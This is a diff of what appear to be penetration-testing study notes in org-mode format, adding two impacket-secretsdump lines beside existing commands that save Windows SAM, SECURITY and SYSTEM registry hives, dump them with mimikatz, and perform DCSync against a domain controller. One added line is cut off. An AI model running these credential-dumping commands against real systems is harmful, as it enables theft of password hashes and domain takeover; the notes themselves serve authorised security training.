@@ -1009,6 +1009,7 @@ EXEC xp_cmdshell 'whoami';
 reg save hklm\sam sam.hiv
 reg save hklm\security security.hiv
 reg save hklm\system system.hiv
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL -> to decrypt
 ./mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam sam.hiv security.hiv system.hiv" "exit"
    #+end_example
 
@@ -1201,6 +1202,7 @@ lsadump::dcsync /user:corp\Administrator
 
     #+begin_example
 impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"password"@192.168.50.70
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL -> 
     #+end_example
     
 *** Silver tickets
